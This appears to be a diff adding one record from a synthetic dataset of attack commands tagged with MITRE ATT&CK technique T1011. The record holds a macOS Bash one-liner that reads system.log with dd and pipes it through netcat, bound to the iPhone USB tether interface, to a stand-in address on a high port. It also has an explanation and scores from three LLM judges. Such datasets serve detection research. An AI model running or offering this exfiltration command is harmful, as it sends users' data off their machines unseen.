@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "dd if=/Users/$USER/Library/Logs/system.log bs=64k | nc -s \"$(networksetup -getinfo 'iPhone USB' | awk -F': ' '/IP address/{print $2}')\" 198.51.100.77 53499",
+  "explanation": "Streams log data bound to the iPhone USB (cellular tether) interface, exfiltrating over a cellular/USB medium per T1011.",
+  "rationale_steps": [
+    "Obtain iPhone USB IP using networksetup",
+    "Bind TCP connection to the tethered IP",
+    "Send data to a non-standard high port"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-641961f7-a2e10d12",
+  "source_prompt_hash": "641961f7",
+  "timestamp_utc": "2025-09-30T08:21:35.084142Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash with balanced quoting, correct command substitution, and valid options for dd, networksetup, awk, and nc.",
+        "semantic_score": 4,
+        "semantic_justification": "It streams the log to netcat bound to the iPhone USB interface IP to exfiltrate over that medium (T1011), though success hinges on the exact interface/IP being present and the destination being reachable (198.51.100.77 is a documentation net).",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T01:38:16.769204Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flags for both dd and nc, and correct use of command substitution.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1011 by reading system logs with dd and exfiltrating them through netcat over an iPhone USB tether connection (cellular medium) rather than the primary network interface.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T01:38:23.352252Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quoting, correct command substitution, and valid flags for all tools used.",
+        "semantic_score": 5,
+        "semantic_justification": "The command effectively uses `nc` with a dynamically acquired source IP of the 'iPhone USB' interface to exfiltrate data, perfectly aligning with the T1011 technique description of using an alternate network medium.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T06:34:18.983292Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
